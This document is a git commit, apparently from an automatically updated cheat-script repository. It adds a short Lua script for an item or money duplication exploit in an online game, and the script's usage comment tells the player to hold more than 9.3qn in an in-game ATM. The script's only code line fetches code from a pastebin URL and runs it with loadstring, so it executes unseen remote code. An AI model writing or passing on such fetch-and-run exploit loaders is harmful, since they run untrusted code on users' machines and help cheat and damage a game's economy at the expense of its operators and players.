23960ab84b2a970d09b59df43a454b9815c9cad9
Emil Toth <emiltoth1870@gmail.com>
2023-03-07 22:10:40 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Limited Time Time Dupe.lua
@@ -0,0 +1,3 @@
+-- credits to Tensei #0227 for discovering the dupe
+-- 1. Deposit / give at least 9.3qn+ in your ATM. You need to be above the ATM limit, which is 9.3qn, the dupe will not work if you don't have above 9.3qn in your atm.
+loadstring(game:HttpGet("https://pastebin.com/raw/CxBN8kxK"))()
